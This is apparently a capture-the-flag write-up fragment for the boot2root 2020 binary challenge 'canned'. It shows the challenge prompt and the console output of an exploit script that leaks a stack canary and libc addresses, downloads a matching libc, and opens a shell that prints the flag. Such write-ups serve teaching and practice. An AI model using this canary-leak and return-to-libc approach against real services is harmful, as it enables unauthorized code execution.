 canned
491

I think i got my flag stuck in a can, can you open it for me

nc 35.238.225.156 1007

Author: Viper_S


```shell
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/canned/canned'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.238.225.156 on port 1007: Done
[*] canary: 0x6570a4d24c9ee600
[*] Loaded 14 cached gadgets for './canned'
[*] puts: 0x7fa9a78a4aa0
[*] libc_url: https://libc.rip/download/libc6_2.27-3ubuntu1.3_amd64.so
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1.3_amd64.so
[*] '/pwd/datajerk/boot2root2020/canned/libc6_2.27-3ubuntu1.3_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fa9a7824000
[*] Switching to interactive mode
$ cat flag
b00t2root{d0_U_h4V3_a_C4N_0pen3R?}
```
